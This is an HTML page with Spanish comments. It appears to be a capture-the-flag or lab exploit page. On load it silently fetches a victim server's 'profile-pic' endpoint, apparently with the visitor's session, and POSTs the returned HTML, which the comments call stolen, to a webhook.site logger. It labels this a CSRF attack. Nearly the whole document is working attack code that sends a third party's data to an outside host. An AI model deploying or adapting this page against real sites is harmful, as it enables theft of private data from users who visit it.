<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Página de Captura Silenciosa de HTML</title>
    <style>
        .success { color: green; font-weight: bold; }
        .error { color: red; font-weight: bold; }
    </style>
</head>
<body>

    <h1>Bienvenido a mi sitio de prueba.</h1>
    <p>Gracias por visitarnos. (El proceso de captura de HTML se está ejecutando).</p>
    
    <p id="estado-peticion">Estado: **Esperando 3 segundos...**</p>

    <script>
        // 1. URL OBJETIVO (El servidor de la víctima)
        const URL_OBJETIVO = 'https://chl-a85cf6b8-7049-4023-abe6-fee13a1a5d5a-imagen-importante.softwareseguro.com.ar/profile-pic';
        
        // 2. TU URL DE LOGGING (¡AQUÍ ESTÁ TU WEBHOOK.SITE URL!)
        const URL_LOGGER = 'https://webhook.site/8a0d86a1-d8f5-4b01-92ef-a3a59a4529d2'; 
        
        const DELAY_MS = 3000;
        const estadoElemento = document.getElementById('estado-peticion');

        function enviarADestino(htmlRobado) {
            // Codificamos el HTML para enviarlo como parámetro de URL en el cuerpo de un POST
            const contenidoCodificado = encodeURIComponent(htmlRobado);

            // Usamos un POST para enviar la cadena HTML larga
            fetch(URL_LOGGER, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                // Enviamos el HTML en el cuerpo con la clave 'html_capturado'
                body: `html_capturado=${contenidoCodificado}` 
            })
            .then(() => {
                estadoElemento.innerHTML = `<span class="success">✅ HTML capturado y enviado silenciosamente.</span>`;
            })
            .catch(error => {
                estadoElemento.innerHTML = `<span class="error">❌ Error al enviar los datos a tu logger.</span>`;
                console.error('Error al enviar los datos robados:', error);
            });
        }

        async function ejecutarAtaque() {
            estadoElemento.textContent = `Estado: Ejecutando ataque CSRF...`;
            
            try {
                // Paso 1: Hacemos el GET al servidor de la víctima
                const response = await fetch(URL_OBJETIVO);
                
                if (!response.ok) {
                    // Si el estado HTTP no es 200-299 (ej. 401 Unauthorized, 403 Forbidden)
                    throw new Error(`Fallo HTTP. Status: ${response.status}.`);
                }

                // Paso 2: Leemos la respuesta como TEXTO (el HTML)
                const htmlRobado = await response.text();
                
                // Paso 3: Enviamos el HTML robado a nuestro servidor de registro
                await enviarADestino(htmlRobado);

            } catch (error) {
                // Captura errores de red, CORS, o los lanzados en el 'if'
                let errorMessage = error.message ? error.message : 'Error desconocido de red/CORS.';
                estadoElemento.innerHTML = `<span class="error">❌ Fallo el ataque: ${errorMessage}</span>`;
                console.error('Fallo en la cadena de ataque:', error);
            }
        }

        window.onload = function() {
            setTimeout(ejecutarAtaque, DELAY_MS);
        };
    </script>

</body>
</html>
